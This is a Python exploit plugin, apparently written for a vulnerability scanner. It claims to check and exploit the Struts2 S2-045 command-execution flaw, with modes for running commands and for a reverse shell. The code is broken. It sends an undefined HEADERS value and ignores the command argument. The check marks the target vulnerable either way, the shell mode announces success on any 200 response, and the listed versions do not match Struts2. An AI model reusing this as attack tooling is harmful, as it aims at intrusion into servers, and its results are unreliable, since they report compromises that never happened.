# !/usr/bin/env python
# coding=utf-8
# ---- ---- ---- ----
# @Author: Guoke324 
# @Date: 2021-08-19 17:31:17
# @Email: querysoft2019@outlook.com
# @LastEditTime: 2021-08-26 11:08:23

import base64
import requests
import http.client
http.client.HTTPConnection._http_vsn = 10 
http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'


def vuln_info():
    info = {
        "vulID":"0001",
        "version":"1.0",
        "author":"Guoke324",
        "createDate":"2021-07-19",
        "updateDate":"2021-07-19",
        "vuln_referer":"http://www.baidu.com",
        "appName":"struts2",
        "appversion":"10.3.6.0.0,12.1.3.0.0,12.2.1.1.0",
        "vuln_name":"命令执行",
        "vuln_calss":"命令执行",
        "vuln_level":"高危",
        "vuln_description":"漏洞描述:代码执行",
        "vuln_identifier":"漏洞编号：S2-045",
        "exist_poc":"1",
        "exist_exp":"1"
    }
    return info


def vuln_verify(url, head, ctime):
    try:
        result = {"Result":False,"Result_Info":"info","target":"url","vuln_name":"vuln_name","path":"poc_name","level":"level","Error_Info":""}
        req = requests.get(url, headers=HEADERS, timeout =ctime, verify=False)
        if 'test888' in req.text:
            result["Result_Info"] = "漏洞存在"
            result['Result'] = True
        else:
            result["Result_Info"] = "漏洞不存在或未知"
            result['Result'] = True           
    except Exception as e:
        result["Error_Info"] = str(e)
    return result

def vuln_attack(url, head, ctime, command, exp_type='cmd'):
    try:
        result = {"Result":False,"Result_Info":"info","target":"url","vuln_name":"vuln_name","path":"poc_name","level":"level","Error_Info":""}
        if exp_type == 'cmd':
            print(url)
            req = requests.get(url, headers=HEADERS, timeout = ctime, verify=False)
            if req.status_code == 200:
                result["Result_Info"] = req.text
                result['Result'] = True
            else:
                result["Error_Info"] = '执行命令失败，请使用其他工具，在下无能为力！'
        if exp_type == "shell":
            req = requests.get(url, headers=HEADERS, timeout = ctime, verify=False)
            if req.status_code == 200:
                result["Result_Info"] = "shell 反弹成功"
                result['Result'] = True
            else:
                result["Error_Info"] = '执行命令失败，请使用其他工具，在下无能为力！'
    except Exception as e:
        result["Error_Info"] = str(e)
    return result
